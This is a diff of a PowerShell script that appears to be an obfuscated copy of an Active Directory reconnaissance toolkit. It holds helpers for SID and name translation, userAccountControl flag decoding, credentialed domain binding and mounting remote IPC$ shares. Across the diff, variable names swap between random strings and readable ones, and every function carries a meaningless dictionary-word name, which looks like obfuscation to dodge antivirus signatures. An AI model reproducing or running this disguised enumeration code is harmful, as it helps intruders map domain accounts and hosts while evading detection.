+                    $IniObject = New-Object PSObject
                 }
                 else {
-                    $utpFPGej99 = @{}
+                    $IniObject = @{}
                 }
-                Switch -Regex -File $VfipJrPp99 {
+                Switch -Regex -File $TargetPath {
                     "^\[(.+)\]" # Section
                     {
-                        $XPNLJqpk99 = $matches[1].Trim()
+                        $Section = $matches[1].Trim()
                         if ($PSBoundParameters['OutputObject']) {
-                            $XPNLJqpk99 = $XPNLJqpk99.Replace(' ', '')
-                            $WwtcElor99 = New-Object PSObject
-                            $utpFPGej99 | Add-Member Noteproperty $XPNLJqpk99 $WwtcElor99
+                            $Section = $Section.Replace(' ', '')
+                            $SectionObject = New-Object PSObject
+                            $IniObject | Add-Member Noteproperty $Section $SectionObject
                         }
                         else {
-                            $utpFPGej99[$XPNLJqpk99] = @{}
+                            $IniObject[$Section] = @{}
                         }
-                        $gtMiDVsQ99 = 0
+                        $CommentCount = 0
                     }
                     "^(;.*)$" # Comment
                     {
                         $Value = $matches[1].Trim()
-                        $gtMiDVsQ99 = $gtMiDVsQ99 + 1
-                        $Name = 'Comment' + $gtMiDVsQ99
+                        $CommentCount = $CommentCount + 1
+                        $Name = 'Comment' + $CommentCount
                         if ($PSBoundParameters['OutputObject']) {
                             $Name = $Name.Replace(' ', '')
-                            $utpFPGej99.$XPNLJqpk99 | Add-Member Noteproperty $Name $Value
+                            $IniObject.$Section | Add-Member Noteproperty $Name $Value
                         }
                         else {
-                            $utpFPGej99[$XPNLJqpk99][$Name] = $Value
+                            $IniObject[$Section][$Name] = $Value
                         }
                     }
                     "(.+?)\s*=(.*)" # Key
                     {
                         $Name, $Value = $matches[1..2]
                         $Name = $Name.Trim()
-                        $ICqkkSip99 = $Value.split(',') | ForEach-Object { $_.Trim() }
+                        $Values = $Value.split(',') | ForEach-Object { $_.Trim() }
                         if ($PSBoundParameters['OutputObject']) {
                             $Name = $Name.Replace(' ', '')
-                            $utpFPGej99.$XPNLJqpk99 | Add-Member Noteproperty $Name $ICqkkSip99
+                            $IniObject.$Section | Add-Member Noteproperty $Name $Values
                         }
                         else {
-                            $utpFPGej99[$XPNLJqpk99][$Name] = $ICqkkSip99
+                            $IniObject[$Section][$Name] = $Values
                         }
                     }
                 }
-                $utpFPGej99
+                $IniObject
             }
         }
     }
     END {
-        $nFPezvSf99.Keys | reeling
+        $MappedComputers.Keys | withdrew
     }
 }
-function corpuscle {
+function boozier {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [System.Management.Automation.PSObject[]]
-        $uCyynScW99,
+        $InputObject,
         [Parameter(Mandatory = $True, Position = 1)]
         [ValidateNotNullOrEmpty()]
         [String]
@@ -603,45 +603,45 @@ function corpuscle {
         [Parameter(Position = 2)]
         [ValidateNotNullOrEmpty()]
         [Char]
-        $mjLOoRTR99 = ',',
+        $Delimiter = ',',
         [Switch]
-        $wQiNgFQJ99
+        $Append
     )
     BEGIN {
-        $vRqVVCQr99 = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
-        $zaAlxykH99 = [System.IO.File]::Exists($vRqVVCQr99)
+        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
+        $Exists = [System.IO.File]::Exists($OutputPath)
         $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
         $Null = $Mutex.WaitOne()
         if ($PSBoundParameters['Append']) {
-            $GkNlQrWs99 = [System.IO.FileMode]::Append
+            $FileMode = [System.IO.FileMode]::Append
         }
         else {
-            $GkNlQrWs99 = [System.IO.FileMode]::Create
-            $zaAlxykH99 = $False
+            $FileMode = [System.IO.FileMode]::Create
+            $Exists = $False
         }
-        $cmYBBLrY99 = New-Object IO.FileStream($vRqVVCQr99, $GkNlQrWs99, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
-        $ITylSrDm99 = New-Object System.IO.StreamWriter($cmYBBLrY99)
-        $ITylSrDm99.AutoFlush = $True
+        $CSVStream = New-Object IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
+        $CSVWriter = New-Object System.IO.StreamWriter($CSVStream)
+        $CSVWriter.AutoFlush = $True
     }
     PROCESS {
-        ForEach ($Entry in $uCyynScW99) {
-            $oGsVMiPU99 = ConvertTo-Csv -InputObject $Entry -Delimiter $mjLOoRTR99 -NoTypeInformation
-            if (-not $zaAlxykH99) {
-                $oGsVMiPU99 | ForEach-Object { $ITylSrDm99.WriteLine($_) }
-                $zaAlxykH99 = $True
+        ForEach ($Entry in $InputObject) {
+            $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation
+            if (-not $Exists) {
+                $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }
+                $Exists = $True
             }
             else {
-                $oGsVMiPU99[1..($oGsVMiPU99.Length-1)] | ForEach-Object { $ITylSrDm99.WriteLine($_) }
+                $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }
             }
         }
     }
     END {
         $Mutex.ReleaseMutex()
-        $ITylSrDm99.Dispose()
-        $cmYBBLrY99.Dispose()
+        $CSVWriter.Dispose()
+        $CSVStream.Dispose()
     }
 }
-function erupt {
+function Tuscon {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.Management.Automation.PSCustomObject')]
     [CmdletBinding()]
@@ -650,27 +650,27 @@ function erupt {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = $Env:COMPUTERNAME
+        $ComputerName = $Env:COMPUTERNAME
     )
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
+        ForEach ($Computer in $ComputerName) {
             try {
-                @(([Net.Dns]::GetHostEntry($cXOPCAwl99)).AddressList) | ForEach-Object {
+                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
                     if ($_.AddressFamily -eq 'InterNetwork') {
                         $Out = New-Object PSObject
-                        $Out | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
+                        $Out | Add-Member Noteproperty 'ComputerName' $Computer
                         $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                         $Out
                     }
                 }
             }
             catch {
-                Write-Verbose "[erupt] Could not resolve $cXOPCAwl99 to an IP Address."
+                Write-Verbose "[Tuscon] Could not resolve $Computer to an IP Address."
             }
         }
     }
 }
-function gain {
+function concurs {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([String])]
     [CmdletBinding()]
@@ -678,59 +678,59 @@ function gain {
         [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('Name', 'Identity')]
         [String[]]
-        $kYMQHBOP99,
+        $ObjectName,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $CwoNHRuW99 = @{}
-        if ($PSBoundParameters['Domain']) { $CwoNHRuW99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Server']) { $CwoNHRuW99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['Credential']) { $CwoNHRuW99['Credential'] = $gxazvivN99 }
+        $DomainSearcherArguments = @{}
+        if ($PSBoundParameters['Domain']) { $DomainSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $DomainSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['Credential']) { $DomainSearcherArguments['Credential'] = $Credential }
     }
     PROCESS {
-        ForEach ($Object in $kYMQHBOP99) {
+        ForEach ($Object in $ObjectName) {
             $Object = $Object -Replace '/','\'
             if ($PSBoundParameters['Credential']) {
-                $DN = kinsman -Identity $Object -OutputType 'DN' @DomainSearcherArguments
+                $DN = corralling -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                 if ($DN) {
-                    $ojqqfkye99 = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                    $IsWOPBva99 = $DN.Split(',')[0].split('=')[1]
-                    $CwoNHRuW99['Identity'] = $IsWOPBva99
-                    $CwoNHRuW99['Domain'] = $ojqqfkye99
-                    $CwoNHRuW99['Properties'] = 'objectsid'
-                    farrowing @DomainSearcherArguments | Select-Object -Expand objectsid
+                    $UserDomain = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                    $UserName = $DN.Split(',')[0].split('=')[1]
+                    $DomainSearcherArguments['Identity'] = $UserName
+                    $DomainSearcherArguments['Domain'] = $UserDomain
+                    $DomainSearcherArguments['Properties'] = 'objectsid'
+                    dermatitis @DomainSearcherArguments | Select-Object -Expand objectsid
                 }
             }
             else {
                 try {
                     if ($Object.Contains('\')) {
-                        $SSNUOPgW99 = $Object.Split('\')[0]
+                        $Domain = $Object.Split('\')[0]
                         $Object = $Object.Split('\')[1]
                     }
                     elseif (-not $PSBoundParameters['Domain']) {
-                        $CwoNHRuW99 = @{}
-                        $SSNUOPgW99 = (debater @DomainSearcherArguments).Name
+                        $DomainSearcherArguments = @{}
+                        $Domain = (southernmost @DomainSearcherArguments).Name
                     }
-                    $Obj = (New-Object System.Security.Principal.NTAccount($SSNUOPgW99, $Object))
+                    $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                     $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                 }
                 catch {
-                    Write-Verbose "[gain] Error converting $SSNUOPgW99\$Object : $_"
+                    Write-Verbose "[concurs] Error converting $Domain\$Object : $_"
                 }
             }
         }
     }
 }
-function woodmen {
+function armpits {
     [OutputType([String])]
     [CmdletBinding()]
     Param(
@@ -738,29 +738,29 @@ function woodmen {
         [Alias('SID')]
         [ValidatePattern('^S-1-.*')]
         [String[]]
-        $vEAcbmpj99,
+        $ObjectSid,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $GnxtbMaP99 = @{}
-        if ($PSBoundParameters['Domain']) { $GnxtbMaP99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Server']) { $GnxtbMaP99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['Credential']) { $GnxtbMaP99['Credential'] = $gxazvivN99 }
+        $ADNameArguments = @{}
+        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
+        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
     }
     PROCESS {
-        ForEach ($pZtebdhW99 in $vEAcbmpj99) {
-            $pZtebdhW99 = $pZtebdhW99.trim('*')
+        ForEach ($TargetSid in $ObjectSid) {
+            $TargetSid = $TargetSid.trim('*')
             try {
-                Switch ($pZtebdhW99) {
+                Switch ($TargetSid) {
                     'S-1-0'         { 'Null Authority' }
                     'S-1-0-0'       { 'Nobody' }
                     'S-1-1'         { 'World Authority' }
@@ -823,17 +823,17 @@ function woodmen {
                     'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                     'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                     Default {
-                        kinsman -Identity $pZtebdhW99 @ADNameArguments
+                        corralling -Identity $TargetSid @ADNameArguments
                     }
                 }
             }
             catch {
-                Write-Verbose "[woodmen] Error converting SID '$pZtebdhW99' : $_"
+                Write-Verbose "[armpits] Error converting SID '$TargetSid' : $_"
             }
         }
     }
 }
-function kinsman {
+function corralling {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [OutputType([String])]
     [CmdletBinding()]
@@ -841,23 +841,23 @@ function kinsman {
         [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('Name', 'ObjectName')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [String]
         [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
-        $oNDUUHxP99,
+        $OutputType,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $mXkjzexj99 = @{
+        $NameTypes = @{
             'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
             'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
             'NT4'               =   3  # fabrikam\pflynn
@@ -871,87 +871,87 @@ function kinsman {
             'SPN'               =   11 # HTTP/kairomac.contoso.com
             'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
         }
-        function Invoke-Method([__ComObject] $Object, [String] $AlrHOHqQ99, $yVAcGcFf99) {
-            $ERfozkEO99 = $Null
-            $ERfozkEO99 = $Object.GetType().InvokeMember($AlrHOHqQ99, 'InvokeMethod', $NULL, $Object, $yVAcGcFf99)
-            Write-Output $ERfozkEO99
+        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
+            $Output = $Null
+            $Output = $Object.GetType().InvokeMember($Method, 'InvokeMethod', $NULL, $Object, $Parameters)
+            Write-Output $Output
         }
-        function Get-Property([__ComObject] $Object, [String] $ULZdFwes99) {
-            $Object.GetType().InvokeMember($ULZdFwes99, 'GetProperty', $NULL, $Object, $NULL)
+        function Get-Property([__ComObject] $Object, [String] $Property) {
+            $Object.GetType().InvokeMember($Property, 'GetProperty', $NULL, $Object, $NULL)
         }
-        function Set-Property([__ComObject] $Object, [String] $ULZdFwes99, $yVAcGcFf99) {
-            [Void] $Object.GetType().InvokeMember($ULZdFwes99, 'SetProperty', $NULL, $Object, $yVAcGcFf99)
+        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
+            [Void] $Object.GetType().InvokeMember($Property, 'SetProperty', $NULL, $Object, $Parameters)
         }
         if ($PSBoundParameters['Server']) {
-            $jIVXxjSC99 = 2
-            $RucSDSfY99 = $mSxqoOjK99
+            $ADSInitType = 2
+            $InitName = $Server
         }
         elseif ($PSBoundParameters['Domain']) {
-            $jIVXxjSC99 = 1
-            $RucSDSfY99 = $SSNUOPgW99
+            $ADSInitType = 1
+            $InitName = $Domain
         }
         elseif ($PSBoundParameters['Credential']) {
-            $Cred = $gxazvivN99.GetNetworkCredential()
-            $jIVXxjSC99 = 1
-            $RucSDSfY99 = $Cred.Domain
+            $Cred = $Credential.GetNetworkCredential()
+            $ADSInitType = 1
+            $InitName = $Cred.Domain
         }
         else {
-            $jIVXxjSC99 = 3
-            $RucSDSfY99 = $Null
+            $ADSInitType = 3
+            $InitName = $Null
         }
     }
     PROCESS {
-        ForEach ($ImYRLJwd99 in $BfpbWwpi99) {
+        ForEach ($TargetIdentity in $Identity) {
             if (-not $PSBoundParameters['OutputType']) {
-                if ($ImYRLJwd99 -match "^[A-Za-z]+\\[A-Za-z ]+") {
-                    $GWOspkOg99 = $mXkjzexj99['DomainSimple']
+                if ($TargetIdentity -match "^[A-Za-z]+\\[A-Za-z ]+") {
+                    $ADSOutputType = $NameTypes['DomainSimple']
                 }
                 else {
-                    $GWOspkOg99 = $mXkjzexj99['NT4']
+                    $ADSOutputType = $NameTypes['NT4']
                 }
             }
             else {
-                $GWOspkOg99 = $mXkjzexj99[$oNDUUHxP99]
+                $ADSOutputType = $NameTypes[$OutputType]
             }
-            $xJEownxI99 = New-Object -ComObject NameTranslate
+            $Translate = New-Object -ComObject NameTranslate
             if ($PSBoundParameters['Credential']) {
                 try {
-                    $Cred = $gxazvivN99.GetNetworkCredential()
-                    Invoke-Method $xJEownxI99 'InitEx' (
-                        $jIVXxjSC99,
-                        $RucSDSfY99,
+                    $Cred = $Credential.GetNetworkCredential()
+                    Invoke-Method $Translate 'InitEx' (
+                        $ADSInitType,
+                        $InitName,
                         $Cred.UserName,
                         $Cred.Domain,
                         $Cred.Password
                     )
                 }
                 catch {
-                    Write-Verbose "[kinsman] Error initializing translation for '$BfpbWwpi99' using alternate credentials : $_"
+                    Write-Verbose "[corralling] Error initializing translation for '$Identity' using alternate credentials : $_"
                 }
             }
             else {
                 try {
-                    $Null = Invoke-Method $xJEownxI99 'Init' (
-                        $jIVXxjSC99,
-                        $RucSDSfY99
+                    $Null = Invoke-Method $Translate 'Init' (
+                        $ADSInitType,
+                        $InitName
                     )
                 }
                 catch {
-                    Write-Verbose "[kinsman] Error initializing translation for '$BfpbWwpi99' : $_"
+                    Write-Verbose "[corralling] Error initializing translation for '$Identity' : $_"
                 }
             }
-            Set-Property $xJEownxI99 'ChaseReferral' (0x60)
+            Set-Property $Translate 'ChaseReferral' (0x60)
             try {
-                $Null = Invoke-Method $xJEownxI99 'Set' (8, $ImYRLJwd99)
-                Invoke-Method $xJEownxI99 'Get' ($GWOspkOg99)
+                $Null = Invoke-Method $Translate 'Set' (8, $TargetIdentity)
+                Invoke-Method $Translate 'Get' ($ADSOutputType)
             }
             catch [System.Management.Automation.MethodInvocationException] {
-                Write-Verbose "[kinsman] Error translating '$ImYRLJwd99' : $($_.Exception.InnerException.Message)"
+                Write-Verbose "[corralling] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)"
             }
         }
     }
 }
-function madly {
+function neutron {
     [OutputType('System.Collections.Specialized.OrderedDictionary')]
     [CmdletBinding()]
     Param(
@@ -960,122 +960,122 @@ function madly {
         [Int]
         $Value,
         [Switch]
-        $GBWfEvAA99
+        $ShowAll
     )
     BEGIN {
-        $PmoYYxuc99 = New-Object System.Collections.Specialized.OrderedDictionary
-        $PmoYYxuc99.Add("SCRIPT", 1)
-        $PmoYYxuc99.Add("ACCOUNTDISABLE", 2)
-        $PmoYYxuc99.Add("HOMEDIR_REQUIRED", 8)
-        $PmoYYxuc99.Add("LOCKOUT", 16)
-        $PmoYYxuc99.Add("PASSWD_NOTREQD", 32)
-        $PmoYYxuc99.Add("PASSWD_CANT_CHANGE", 64)
-        $PmoYYxuc99.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
-        $PmoYYxuc99.Add("TEMP_DUPLICATE_ACCOUNT", 256)
-        $PmoYYxuc99.Add("NORMAL_ACCOUNT", 512)
-        $PmoYYxuc99.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
-        $PmoYYxuc99.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
-        $PmoYYxuc99.Add("SERVER_TRUST_ACCOUNT", 8192)
-        $PmoYYxuc99.Add("DONT_EXPIRE_PASSWORD", 65536)
-        $PmoYYxuc99.Add("MNS_LOGON_ACCOUNT", 131072)
-        $PmoYYxuc99.Add("SMARTCARD_REQUIRED", 262144)
-        $PmoYYxuc99.Add("TRUSTED_FOR_DELEGATION", 524288)
-        $PmoYYxuc99.Add("NOT_DELEGATED", 1048576)
-        $PmoYYxuc99.Add("USE_DES_KEY_ONLY", 2097152)
-        $PmoYYxuc99.Add("DONT_REQ_PREAUTH", 4194304)
-        $PmoYYxuc99.Add("PASSWORD_EXPIRED", 8388608)
-        $PmoYYxuc99.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
-        $PmoYYxuc99.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
+        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
+        $UACValues.Add("SCRIPT", 1)
+        $UACValues.Add("ACCOUNTDISABLE", 2)
+        $UACValues.Add("HOMEDIR_REQUIRED", 8)
+        $UACValues.Add("LOCKOUT", 16)
+        $UACValues.Add("PASSWD_NOTREQD", 32)
+        $UACValues.Add("PASSWD_CANT_CHANGE", 64)
+        $UACValues.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
+        $UACValues.Add("TEMP_DUPLICATE_ACCOUNT", 256)
+        $UACValues.Add("NORMAL_ACCOUNT", 512)
+        $UACValues.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
+        $UACValues.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
+        $UACValues.Add("SERVER_TRUST_ACCOUNT", 8192)
+        $UACValues.Add("DONT_EXPIRE_PASSWORD", 65536)
+        $UACValues.Add("MNS_LOGON_ACCOUNT", 131072)
+        $UACValues.Add("SMARTCARD_REQUIRED", 262144)
+        $UACValues.Add("TRUSTED_FOR_DELEGATION", 524288)
+        $UACValues.Add("NOT_DELEGATED", 1048576)
+        $UACValues.Add("USE_DES_KEY_ONLY", 2097152)
+        $UACValues.Add("DONT_REQ_PREAUTH", 4194304)
+        $UACValues.Add("PASSWORD_EXPIRED", 8388608)
+        $UACValues.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
+        $UACValues.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
     }
     PROCESS {
-        $CfmYbAtr99 = New-Object System.Collections.Specialized.OrderedDictionary
-        if ($GBWfEvAA99) {
-            ForEach ($FXxXILfT99 in $PmoYYxuc99.GetEnumerator()) {
-                if ( ($Value -band $FXxXILfT99.Value) -eq $FXxXILfT99.Value) {
-                    $CfmYbAtr99.Add($FXxXILfT99.Name, "$($FXxXILfT99.Value)+")
+        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary
+        if ($ShowAll) {
+            ForEach ($UACValue in $UACValues.GetEnumerator()) {
+                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
+                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                 }
                 else {
-                    $CfmYbAtr99.Add($FXxXILfT99.Name, "$($FXxXILfT99.Value)")
+                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                 }
             }
         }
         else {
-            ForEach ($FXxXILfT99 in $PmoYYxuc99.GetEnumerator()) {
-                if ( ($Value -band $FXxXILfT99.Value) -eq $FXxXILfT99.Value) {
-                    $CfmYbAtr99.Add($FXxXILfT99.Name, "$($FXxXILfT99.Value)")
+            ForEach ($UACValue in $UACValues.GetEnumerator()) {
+                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
+                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                 }
             }
         }
-        $CfmYbAtr99
+        $ResultUACValues
     }
 }
-function Piedmont {
+function demarcates {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True)]
         [Alias('GroupName', 'GroupIdentity')]
         [String]
-        $BfpbWwpi99,
+        $Identity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     Add-Type -AssemblyName System.DirectoryServices.AccountManagement
     try {
-        if ($PSBoundParameters['Domain'] -or ($BfpbWwpi99 -match '.+\\.+')) {
-            if ($BfpbWwpi99 -match '.+\\.+') {
-                $PagMzhMW99 = $BfpbWwpi99 | kinsman -OutputType Canonical
-                if ($PagMzhMW99) {
-                    $FBXhCRgM99 = $PagMzhMW99.SubString(0, $PagMzhMW99.IndexOf('/'))
-                    $YkFEynMQ99 = $BfpbWwpi99.Split('\')[1]
-                    Write-Verbose "[Piedmont] Binding to domain '$FBXhCRgM99'"
+        if ($PSBoundParameters['Domain'] -or ($Identity -match '.+\\.+')) {
+            if ($Identity -match '.+\\.+') {
+                $ConvertedIdentity = $Identity | corralling -OutputType Canonical
+                if ($ConvertedIdentity) {
+                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))
+                    $ObjectIdentity = $Identity.Split('\')[1]
+                    Write-Verbose "[demarcates] Binding to domain '$ConnectTarget'"
                 }
             }
             else {
-                $YkFEynMQ99 = $BfpbWwpi99
-                Write-Verbose "[Piedmont] Binding to domain '$SSNUOPgW99'"
-                $FBXhCRgM99 = $SSNUOPgW99
+                $ObjectIdentity = $Identity
+                Write-Verbose "[demarcates] Binding to domain '$Domain'"
+                $ConnectTarget = $Domain
             }
             if ($PSBoundParameters['Credential']) {
-                Write-Verbose '[Piedmont] Using alternate credentials'
-                $JBFcwhcg99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $FBXhCRgM99, $gxazvivN99.UserName, $gxazvivN99.GetNetworkCredential().Password)
+                Write-Verbose '[demarcates] Using alternate credentials'
+                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
             }
             else {
-                $JBFcwhcg99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $FBXhCRgM99)
+                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)
             }
         }
         else {
             if ($PSBoundParameters['Credential']) {
-                Write-Verbose '[Piedmont] Using alternate credentials'
-                $WoTBIsEB99 = debater | Select-Object -ExpandProperty Name
-                $JBFcwhcg99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $WoTBIsEB99, $gxazvivN99.UserName, $gxazvivN99.GetNetworkCredential().Password)
+                Write-Verbose '[demarcates] Using alternate credentials'
+                $DomainName = southernmost | Select-Object -ExpandProperty Name
+                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
             }
             else {
-                $JBFcwhcg99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
+                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
             }
-            $YkFEynMQ99 = $BfpbWwpi99
+            $ObjectIdentity = $Identity
         }
         $Out = New-Object PSObject
-        $Out | Add-Member Noteproperty 'Context' $JBFcwhcg99
-        $Out | Add-Member Noteproperty 'Identity' $YkFEynMQ99
+        $Out | Add-Member Noteproperty 'Context' $Context
+        $Out | Add-Member Noteproperty 'Identity' $ObjectIdentity
         $Out
     }
     catch {
-        Write-Warning "[Piedmont] Error creating binding for object ('$BfpbWwpi99') context : $_"
+        Write-Warning "[demarcates] Error creating binding for object ('$Identity') context : $_"
     }
 }
-function distinctively {
+function depicting {
     [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
     Param(
         [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99,
+        $ComputerName,
         [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
         [ValidatePattern('\\\\.*\\.*')]
         [String[]]
@@ -1083,37 +1083,37 @@ function distinctively {
         [Parameter(Mandatory = $True)]
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99
+        $Credential
     )
     BEGIN {
-        $uFaCgmJN99 = [Activator]::CreateInstance($hMRxlbGU99)
-        $uFaCgmJN99.dwType = 1
+        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)
+        $NetResourceInstance.dwType = 1
     }
     PROCESS {
         $Paths = @()
         if ($PSBoundParameters['ComputerName']) {
-            ForEach ($vnhDKlDn99 in $VrEmrUHq99) {
-                $vnhDKlDn99 = $vnhDKlDn99.Trim('\')
-                $Paths += ,"\\$vnhDKlDn99\IPC$"
+            ForEach ($TargetComputerName in $ComputerName) {
+                $TargetComputerName = $TargetComputerName.Trim('\')
+                $Paths += ,"\\$TargetComputerName\IPC$"
             }
         }
         else {
             $Paths += ,$Path
         }
-        ForEach ($VfipJrPp99 in $Paths) {
-            $uFaCgmJN99.lpRemoteName = $VfipJrPp99
-            Write-Verbose "[distinctively] Attempting to mount: $VfipJrPp99"
-            $fYOedlSN99 = $Mpr::WNetAddConnection2W($uFaCgmJN99, $gxazvivN99.GetNetworkCredential().Password, $gxazvivN99.UserName, 4)
-            if ($fYOedlSN99 -eq 0) {
-                Write-Verbose "$VfipJrPp99 successfully mounted"
+        ForEach ($TargetPath in $Paths) {
+            $NetResourceInstance.lpRemoteName = $TargetPath
+            Write-Verbose "[depicting] Attempting to mount: $TargetPath"
